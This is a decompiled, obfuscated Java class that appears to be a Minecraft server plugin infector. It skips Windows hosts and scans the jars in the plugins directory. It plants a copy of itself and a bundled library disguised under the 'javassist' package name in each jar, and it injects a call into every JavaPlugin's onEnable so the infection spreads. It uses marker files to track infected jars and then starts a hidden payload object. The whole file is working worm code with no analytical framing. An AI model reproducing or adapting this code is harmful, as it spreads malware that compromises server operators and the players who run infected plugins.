/*
 * Decompiled with CFR 0.151.
 */
package me.rok.main;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.FileAttribute;
import java.security.SecureRandom;
import java.util.Iterator;
import javassist.CtClass;
import javassist.aa;
import javassist.b_0;
import javassist.f;
import javassist.i_0;
import javassist.k_0;
import javassist.ws.a;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class MainL10 {
    private static a a;
    private static File a;
    private static boolean a;
    private static final String a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
    private static final SecureRandom a;

    static {
        a = false;
        a = new SecureRandom();
    }

    public final void a(String string) {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            return;
        }
        a = new File(string);
        f f2 = f.a();
        b_0 b_02 = new b_0(this.getClass());
        f2.a(b_02);
        Path path2 = Paths.get(this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        FileSystem fileSystem = FileSystems.newFileSystem(path2, null);
        if (!Files.exists(fileSystem.getPath("/javassist", new String[0]), new LinkOption[0])) {
            return;
        }
        Path path3 = fileSystem.getPath("/javassist", new String[0]);
        CtClass ctClass = f2.c(this.getClass().getName());
        for (File file : javassist.ws.a.a(a)) {
            try {
                FileSystem fileSystem2 = FileSystems.newFileSystem(file.toPath(), null);
                if (Files.exists(fileSystem2.getPath(".l_ignore", new String[0]), new LinkOption[0])) continue;
                try {
                    for (Path path4 : fileSystem2.getRootDirectories()) {
                        Iterator iterator = Files.walk(path4, 100, new FileVisitOption[0]).filter(path -> !Files.isDirectory(path, new LinkOption[0]) && path.toString().endsWith(".class")).iterator();
                        while (iterator.hasNext()) {
                            try {
                                ctClass.c();
                                Path path5 = (Path)iterator.next();
                                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Files.readAllBytes(path5));
                                CtClass ctClass2 = f2.a(byteArrayInputStream);
                                if (ctClass2.b().a().contains("JavaPlugin")) {
                                    Path path6 = fileSystem2.getPath(path5.getParent().toString(), String.valueOf(ctClass2.b()) + "L10.class");
                                    if (!Files.exists(fileSystem2.getPath(".l1", new String[0]), new LinkOption[0])) {
                                        ctClass.a(path6.toString().replace(".class", "").replaceFirst("/", ""));
                                        Files.createFile(fileSystem2.getPath(".l1", new String[0]), new FileAttribute[0]);
                                        Files.write(path6, ctClass.a(), StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                                        try {
                                            Files.createDirectory(fileSystem2.getPath("/javassist", new String[0]), new FileAttribute[0]);
                                        }
                                        catch (Exception exception) {
                                            // empty catch block
                                        }
                                        Files.walkFileTree(path3, new k_0(fileSystem2.getPath("/javassist", new String[0])));
                                    } else {
                                        i_0 i_02 = ctClass2.a("onEnable");
                                        i_02.d("new " + path6.toString().replace("/", ".").replace(".class", "").replaceFirst(".", "") + "().a(getDataFolder().getParent());");
                                        Files.write(path5, ctClass2.a(), StandardOpenOption.WRITE);
                                        Files.createFile(fileSystem2.getPath(".l_ignore", new String[0]), new FileAttribute[0]);
                                    }
                                }
                                byteArrayInputStream.close();
                            }
                            catch (Exception exception) {
                                boolean cfr_ignored_0 = exception instanceof aa;
                            }
                        }
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                fileSystem2.close();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (!a) {
            a = true;
            this.a(string);
            return;
        }
        if (System.getProperty("fym_st") == null) {
            System.setProperty("fym_st", "true");
            a = new a();
        }
    }

    public static String a(int n2) {
        StringBuilder stringBuilder = new StringBuilder();
        int n3 = 0;
        while (n3 < n2) {
            stringBuilder.append(a.charAt(a.nextInt(a.length())));
            ++n3;
        }
        return stringBuilder.toString();
    }
}

